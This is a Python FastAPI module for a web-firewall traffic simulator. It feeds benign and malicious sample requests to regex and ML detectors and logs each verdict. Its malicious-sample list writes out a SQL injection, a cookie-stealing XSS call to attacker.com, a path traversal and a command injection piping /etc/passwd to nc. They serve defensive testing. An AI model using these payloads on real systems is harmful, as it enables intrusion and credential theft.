import asyncio
import random
from datetime import datetime
from fastapi import APIRouter

from api.models.schemas import RequestData
from api.services.database import get_collection
from api.services.redis_client import get_redis
from api.services.ws_manager import manager
from inference.ensemble import predict_anomaly
from inference.features import build_sequence, extract_features
from inference.model import model_instance
from inference.rule_generator import generate_rule_from_payload

router = APIRouter()

simulation_task = None
is_simulating = False

BENIGN_SAMPLES = [
    {"method": "GET", "path": "/api/v1/products/list", "request_body": "page=1&limit=20&category=electronics"},
    {"method": "GET", "path": "/api/v1/user/profile", "request_body": "user_id=1042&format=json"},
    {"method": "POST", "path": "/api/v1/cart/add", "request_body": "product_id=5821&quantity=1"},
    {"method": "GET", "path": "/dashboard/stats", "request_body": "timeframe=24h"},
    {"method": "GET", "path": "/search", "request_body": "q=wireless+headphones&sort=price_asc"},
]

MALICIOUS_SAMPLES = [
    {"method": "POST", "path": "/api/v1/users/search", "request_body": "query=admin' UNION SELECT 1, username, password FROM users--"},
    {"method": "POST", "path": "/comment/submit", "request_body": "comment=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"},
    {"method": "GET", "path": "/download", "request_body": "file=../../../../../../etc/passwd"},
    {"method": "POST", "path": "/api/system/ping", "request_body": "target=127.0.0.1; cat /etc/passwd | nc attacker.org 1337"},
]

async def run_simulation_loop():
    global is_simulating
    while is_simulating:
        try:
            await asyncio.sleep(random.uniform(0.4, 0.9))
            is_attack = random.random() < 0.20
            sample = random.choice(MALICIOUS_SAMPLES) if is_attack else random.choice(BENIGN_SAMPLES)

            req = RequestData(
                method=sample["method"],
                path=sample["path"],
                protocol="HTTP/1.1",
                request_body=sample["request_body"]
            )

            r = get_redis()
            payload = req.request_body or req.path
            matched_rule = None

            if r:
                existing_rules = r.smembers("waf:rules:regex")
                if existing_rules:
                    import re
                    for rule in existing_rules:
                        rule_str = rule.decode("utf-8") if isinstance(rule, bytes) else rule
                        clean_pattern = re.sub(r'[\`\(\)\?\:\-\\\|\^\$]+', ' ', rule_str.replace("(?i)", "")).strip()
                        clean_pattern = ' '.join(clean_pattern.split())
                        if clean_pattern and (clean_pattern.lower() in payload.lower() or payload.lower() in clean_pattern.lower()):
                            matched_rule = rule_str
                            break

            if matched_rule:
                is_malicious = True
                rec_error = 0.0
                action = "BLOCK"
                new_rule = matched_rule
            else:
                formatted_log = build_sequence(req.model_dump())
                rec_error, cls_emb, perplexity = extract_features(formatted_log)
                category, _ = predict_anomaly(rec_error, cls_emb, perplexity)
                is_malicious = bool(category)
                action = "BLOCK" if is_malicious else "ALLOW"
                new_rule = None
                if is_malicious:
                    new_rule = generate_rule_from_payload(payload)
                    if new_rule and r:
                        r.sadd("waf:rules:regex", new_rule)

            timestamp = datetime.utcnow()
            doc_id = f"sim_{int(timestamp.timestamp() * 1000)}"

            collection = get_collection()
            if collection is not None:
                doc = {
                    "timestamp": timestamp,
                    "request": req.model_dump(),
                    "analysis": {"is_malicious": is_malicious, "reconstruction_loss": rec_error},
                    "action_taken": action,
                    "auto_learned_rule": new_rule,
                }
                res = collection.insert_one(doc)
                doc_id = str(res.inserted_id)

            await manager.broadcast({
                "_id": doc_id,
                "timestamp": timestamp.isoformat(),
                "method": req.method,
                "path": req.path,
                "request_body": req.request_body,
                "action_taken": action,
                "is_malicious": is_malicious,
                "reconstruction_loss": rec_error,
                "auto_learned_rule": new_rule,
            })
        except Exception as e:
            await asyncio.sleep(1)

@router.post("/simulate/start")
async def start_simulation():
    global simulation_task, is_simulating
    if not is_simulating:
        is_simulating = True
        simulation_task = asyncio.create_task(run_simulation_loop())
    return {"status": "active", "message": "Traffic simulator running."}

@router.post("/simulate/stop")
async def stop_simulation():
    global is_simulating, simulation_task
    is_simulating = False
    if simulation_task:
        simulation_task.cancel()
        simulation_task = None
    return {"status": "stopped", "message": "Traffic simulator stopped."}

@router.get("/simulate/status")
async def simulation_status():
    return {"is_simulating": is_simulating}
